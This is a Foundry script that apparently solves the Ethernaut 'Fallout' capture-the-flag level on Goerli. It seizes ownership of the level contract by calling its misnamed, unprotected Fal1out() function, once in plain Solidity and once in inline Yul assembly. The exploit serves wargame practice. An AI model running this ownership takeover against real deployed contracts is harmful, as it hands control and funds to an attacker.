// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

interface Instance {
    function owner() external view returns (address);

    function Fal1out() external payable;
}

contract FalloutScript is EthernautScript {
    string network = "goerli";
    address level = 0x0AA237C34532ED79676BCEa22111eA2D01c3d3e7;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        instance.Fal1out();
        require(instance.owner() == player);
    }

    function yulVersion() internal {
        assembly {
            mstore(0, "Fal1out()")
            mstore(0, keccak256(0, 9))
            let success := call(gas(), sload(instance.slot), 0, 0, 4, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            mstore(0, "owner()")
            mstore(0, keccak256(0, 7))
            success := staticcall(gas(), sload(instance.slot), 0, 4, 0, 0x20)
            if iszero(success) {
                revert(0, 0)
            }
            if iszero(eq(mload(0), sload(player.slot))) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
